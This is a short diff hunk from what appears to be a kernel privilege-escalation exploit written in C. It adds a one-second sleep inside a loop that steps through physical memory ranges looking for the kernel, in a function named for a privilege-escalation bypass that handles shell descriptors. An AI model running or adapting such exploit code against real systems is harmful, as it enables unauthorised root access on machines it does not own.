@@ -387,7 +387,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
 	{
 		unsigned long long kernel_iteration_base;
-
+		sleep(1);
 		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);
 
 		PRINTF_VERBOSE("[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
